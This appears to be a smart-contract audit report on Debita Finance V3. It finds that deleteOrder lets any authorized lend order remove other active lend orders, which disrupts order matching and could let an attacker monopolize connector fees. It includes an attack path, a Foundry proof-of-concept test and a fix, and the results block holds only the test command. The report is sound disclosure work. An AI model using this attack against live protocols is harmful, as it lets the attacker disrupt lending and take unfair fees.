# Any authorized lend order can disrupt the protocol's matching process.

### Summary

The unrestricted use of the [`deleteOrder`](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/DebitaLendOfferFactory.sol#L207) function in [ `DebitaV3LoanFactory.sol`](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/DebitaLendOfferFactory.sol#L207), as it only checks if a lendOrder is legit through [`onlyLendOrder`](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/DebitaLendOfferFactory.sol#L102C14-L102C27) will cause disruption to the matching process for connectors (users or bots) retrieving active lend orders. As any lend order can call `deleteOrder` to remove entries from `allActiveLendOrders`, it disrupts the `getActiveOrders` function, which connectors will rely on to retrieve `DLOImplementation.LendInfo`, thereby disturbing the matchOffersV3 process.

### Root Cause

In [`DebitaV3LoanFactory.sol:207`](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/DebitaLendOfferFactory.sol#L207), the `deleteOrder` function allows any lend order to remove itself or others from `allActiveLendOrders`, impacting the ability to retrieve active orders via [`getActiveOrders`](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/DebitaLendOfferFactory.sol#L222).

### Internal pre-conditions

1. A valid lend order must call deleteOrder.
2. The lend order must exist in the allActiveLendOrders mapping.

### External pre-conditions

_No response_

### Attack Path

1. An authorized lend order calls `deleteOrder` with a valid `_lendOrder` address.
2. The order is removed from `allActiveLendOrders`, breaking the indexing.
3. A connector calling `getActiveOrders` encounters incomplete or incorrect data.
4. This prevents proper matching via `DebitaV3Aggregator::matchOffersV3`, disrupting the protocolâ€™s functionality.

### Impact

1. **Economic Disruption:** The matching process is disrupted, causing delays in transactions and potential loss of revenue for both lenders and borrowers.
2. **Fee Monopolization:** A malicious user could repeatedly remove other lend orders, after retreiving `allActiveLendOrders`. This allows them to monopolize the 15% connector fee by becoming the only participant capable of matching offers, leading to an unfair advantage and a compromised system.

### PoC

Add this test to `/test/local/Loan/MultiplePrinciples.t.sol`.
```solidity
function testDeleteLendOrder() public {
        // Log the initial number of active lend orders
        console.log(
            "Active orders count before deletion :::",
            DLOFactoryContract.activeOrdersCount()
        );

        // Log the addresses of the active lend orders before deletion
        for (uint i = 0; i < 3; i++) {
            console.log(
                "Order",
                i,
                "has address:",
                DLOFactoryContract.allActiveLendOrders(i)
            );
        }

        // Start impersonating the LendOrder contract to call deleteOrder
        vm.startPrank(address(LendOrder));

        // Attempt to delete three lend orders sequentially
        DLOFactoryContract.deleteOrder(address(LendOrder));
        DLOFactoryContract.deleteOrder(address(SecondLendOrder));
        DLOFactoryContract.deleteOrder(address(ThirdLendOrder));

        // Stop impersonating after calling deleteOrder
        vm.stopPrank();

        // Log the number of active lend orders after deletion
        console.log(
            "Active orders count after deletion :::",
            DLOFactoryContract.activeOrdersCount()
        );

        // Log the remaining active lend orders to verify deletion
        for (uint i = 0; i < 3; i++) {
            console.log(
                "Order",
                i,
                "has address:",
                DLOFactoryContract.allActiveLendOrders(i)
            );
        }
    }
```
Results in this : 

```shell
  $ forge test --mt testDeleteLendOrder -vv

### Mitigation

Add a check inside the [`deleteOrder`](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/main/Debita-V3-Contracts/contracts/DebitaLendOfferFactory.sol#L207) function, such as:

```diff
+ require(msg.sender == _lendOrder, "Caller must be the lend order contract");
```
This additional verification complements the `onlyLendOrder` modifier and ensures that `msg.sender` not only has permission but is also the specific contract it claims to be. It aligns with the expected behavior when debts are repaid through the `DLOImplementation`.
